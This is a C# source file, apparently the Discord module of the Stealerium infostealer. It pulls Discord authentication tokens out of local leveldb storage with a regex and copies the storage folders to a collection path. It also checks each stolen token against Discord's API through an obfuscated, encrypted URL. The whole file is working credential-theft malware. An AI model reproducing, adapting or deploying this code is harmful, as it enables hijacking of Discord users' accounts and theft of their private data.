using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using Stealerium.Helpers;
using Stealerium.Modules.Implant;

namespace Stealerium.Target.Messengers
{
    internal sealed class Discord
    {
        private static readonly Regex TokenRegex =
            new Regex(@"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}");

        private static readonly string[] DiscordDirectories =
        {
            "Discord\\Local Storage\\leveldb",
            "Discord PTB\\Local Storage\\leveldb",
            "Discord Canary\\leveldb"
        };

        // Write tokens
        public static void WriteDiscord(string[] lcDicordTokens, string sSavePath)
        {
            if (lcDicordTokens.Length != 0)
            {
                Directory.CreateDirectory(sSavePath);
                Counter.Discord = true;
                try
                {
                    foreach (var token in lcDicordTokens)
                        File.AppendAllText(sSavePath + "\\tokens.txt", token + "\n");
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
            }

            try
            {
                CopyLevelDb(sSavePath);
            }
            catch
            {
                // ignored
            }
        }

        // Copy Local State directory
        private static void CopyLevelDb(string sSavePath)
        {
            foreach (var dir in DiscordDirectories)
            {
                var directory = Path.GetDirectoryName(Path.Combine(Paths.Appdata, dir));
                if (directory == null) continue;
                var cpdirectory = Path.Combine(sSavePath,
                    new DirectoryInfo(directory).Name);

                if (!Directory.Exists(directory))
                    continue;
                try
                {
                    Filemanager.CopyDirectory(directory, cpdirectory);
                }
                catch
                {
                    // ignored
                }
            }
        }

        // Check token
        private static string TokenState(string token)
        {
            try
            {
                using (var http = new WebClient())
                {
                    http.Headers.Add("Authorization", token);
                    var result = http.DownloadString(
                        StringsCrypt.Decrypt(new byte[]
                        {
                            241, 158, 131, 195, 114, 143, 24, 236, 11, 26, 170, 234, 134, 223, 42, 61, 187, 96, 145, 91,
                            90, 194, 45, 241, 225, 114, 244, 246, 148, 239, 168, 39, 54, 186, 251, 17, 156, 78, 204,
                            216, 18, 220, 138, 249, 160, 239, 29, 0
                        })); // https://discordapp.com/api/v6/users/@me
                    return result.Contains("Unauthorized") ? "Token is invalid" : "Token is valid";
                }
            }
            catch
            {
                // ignored
            }

            return "Connection error";
        }

        // Get discord tokens
        public static string[] GetTokens()
        {
            var tokens = new List<string>();
            try
            {
                foreach (var dir in DiscordDirectories)
                {
                    var directory = Path.Combine(Paths.Appdata, dir);
                    var cpdirectory = Path.Combine(Path.GetTempPath(), new DirectoryInfo(directory).Name);

                    if (!Directory.Exists(directory))
                        continue;

                    Filemanager.CopyDirectory(directory, cpdirectory);

                    tokens.AddRange(from file in Directory.GetFiles(cpdirectory)
                        where file.EndsWith(".log") || file.EndsWith(".ldb")
                        select File.ReadAllText(file)
                        into text
                        select TokenRegex.Match(text)
                        into match
                        where match.Success
                        select $"{match.Value} - {TokenState(match.Value)}");

                    Filemanager.RecursiveDelete(cpdirectory);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }

            return tokens.ToArray();
        }
    }
}